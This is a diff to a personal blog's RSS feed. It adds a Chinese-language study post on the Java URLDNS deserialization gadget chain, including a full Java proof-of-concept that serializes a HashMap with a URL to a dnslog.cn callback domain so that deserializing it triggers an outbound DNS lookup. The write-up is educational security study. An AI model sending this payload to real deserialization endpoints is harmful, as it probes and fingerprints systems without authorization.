@@ -6,7 +6,106 @@
         <description>Recent content on Byebyedoggy</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Wed, 19 Nov 2025 22:19:38 +0800</lastBuildDate><atom:link href="https://byebydoggy.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 20 Nov 2025 16:09:09 +0800</lastBuildDate><atom:link href="https://byebydoggy.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>JavaSec URLDNS</title>
+        <link>https://byebydoggy.github.io/post/2025/javasec-urldns/</link>
+        <pubDate>Thu, 20 Nov 2025 16:09:09 +0800</pubDate>
+        
+        <guid>https://byebydoggy.github.io/post/2025/javasec-urldns/</guid>
+        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post JavaSec URLDNS" /&gt;&lt;h1 id=&#34;什么是反序列化&#34;&gt;什么是反序列化
+&lt;/h1&gt;&lt;p&gt;序列化指的是把类实例化的对象转化成字节流或者字符串，便于传输&lt;/p&gt;
+&lt;p&gt;对于Java序列化的类需要实现Serializable接口&lt;/p&gt;
+&lt;p&gt;反序列化即将字节流与字符串重新转化回对象&lt;/p&gt;
+&lt;p&gt;反序列化时调用&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ObjectInputStream ois = new ObjectInputStream(fis)) {
+
+// 反序列化对象
+Dog dog = (Dog) ois.readObject();
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;原理&#34;&gt;原理
+&lt;/h1&gt;&lt;h2 id=&#34;入口点&#34;&gt;入口点：
+&lt;/h2&gt;&lt;p&gt;java.util.HashMap.readObject&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;putVal(hash(key), key, value, false, false);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中hash方法调用了键对象的hashCode方法&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;static final int hash(Object key) {
+    int h;
+    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &amp;gt;&amp;gt;&amp;gt; 16);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;利用链&#34;&gt;利用链
+&lt;/h2&gt;&lt;p&gt;先看java.net.URL类，URL重写了hashCode方法&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public synchronized int hashCode() {
+    if (hashCode != -1)
+        return hashCode;
+
+    hashCode = handler.hashCode(this);
+    return hashCode;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;hashCode是私有属性，防止重复调用，首次实例化对象时默认为-1，因此会调用handler.hashCode方法&lt;/p&gt;
+&lt;p&gt;该方法中getHostAddress尝试获取url的IP地址&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;InetAddress addr = getHostAddress(u);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最终在InetAddress中实例化域名对象时触发DNS查询&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if (addrs == null) {
+    // create a NameServiceAddresses instance which will look up
+    // the name service and install it within cache...
+Addresses oldAddrs = cache.putIfAbsent(
+        host,
+            addrs = new NameServiceAddresses(host)
+    );
+    if (oldAddrs != null) { // lost putIfAbsent race
+addrs = oldAddrs;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;payload&#34;&gt;Payload
+&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.FileInputStream;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.FileOutputStream;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.ObjectInputStream;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.ObjectOutputStream;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.lang.reflect.Field;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.net.URL;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.text.SimpleDateFormat;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.Date;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.HashMap;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;URLDemo&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args) &lt;span style=&#34;color:#66d9ef&#34;&gt;throws&lt;/span&gt; Exception {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Date nowTime &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Date();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        HashMap hashmap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; HashMap();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        URL url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; URL(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://lttx9f.dnslog.cn&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        SimpleDateFormat simpleDateFormat &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; SimpleDateFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;yyyy-MM-dd hh:mm:ss&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Field filed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Class.&lt;span style=&#34;color:#a6e22e&#34;&gt;forName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;java.net.URL&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;getDeclaredField&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hashCode&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        filed.&lt;span style=&#34;color:#a6e22e&#34;&gt;setAccessible&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);  &lt;span style=&#34;color:#75715e&#34;&gt;// 绕过Java语言权限控制检查的权限&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        filed.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(url, 209);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hashmap.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(url, 209);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;当前时间为: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; simpleDateFormat.&lt;span style=&#34;color:#a6e22e&#34;&gt;format&lt;/span&gt;(nowTime));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        filed.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(url, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;1);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            FileOutputStream fileOutputStream &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; FileOutputStream(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./dnsser&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ObjectOutputStream objectOutputStream &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ObjectOutputStream(fileOutputStream);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            objectOutputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;writeObject&lt;/span&gt;(hashmap);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            objectOutputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            fileOutputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            FileInputStream fileInputStream &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; FileInputStream(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./dnsser&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ObjectInputStream objectInputStream &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ObjectInputStream(fileInputStream);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            objectInputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;readObject&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            objectInputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            fileInputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception e) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            e.&lt;span style=&#34;color:#a6e22e&#34;&gt;printStackTrace&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;踩坑&#34;&gt;踩坑
+&lt;/h1&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;filed.setAccessible(true);  // 绕过Java语言权限控制检查的权限
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;访问私有属性在Java9以上需要额外参数，于是我想构建时使用JAVA8&lt;/p&gt;
+&lt;p&gt;若使用了高版本特性编写了JAVA代码，构建时再使用JAVA8会报错java: 警告: 源发行版 18 需要目标发行版 18，建议直接以JAVA8重新启个项目，不然我也不知道哪个是新特性啊。&lt;/p&gt;
+&lt;h1 id=&#34;参考文献&#34;&gt;参考文献
+&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/articles/web/327710.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Java安全学习—URLDNS链 - FreeBuf网络安全行业门户&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Hummingbot内存泄露Bug排查</title>
         <link>https://byebydoggy.github.io/post/2025/hummingbot%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2bug%E6%8E%92%E6%9F%A5/</link>
         <pubDate>Wed, 19 Nov 2025 22:19:38 +0800</pubDate>
@@ -21,14 +120,6 @@
 &lt;/h1&gt;&lt;p&gt;1.基于Hummingbot Connector和Python MT5将MT5集成到Hummingbot以实现加密货币与最大的外汇市场统一策略编写。&lt;/p&gt;
 &lt;p&gt;2.修改Hummingbot的回测框架，以支持秒级TimeFrame和从本地文件流式传输数据。&lt;/p&gt;
 </description>
-        </item>
-        <item>
-        <title>1118 Hummingbot Backtest</title>
-        <link>https://byebydoggy.github.io/post/2025/1118-hummingbot-backtest/</link>
-        <pubDate>Tue, 18 Nov 2025 16:20:25 +0800</pubDate>
-        
-        <guid>https://byebydoggy.github.io/post/2025/1118-hummingbot-backtest/</guid>
-        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post 1118 Hummingbot Backtest" /&gt;</description>
         </item>
         <item>
         <title>ARKM前端逆向</title>
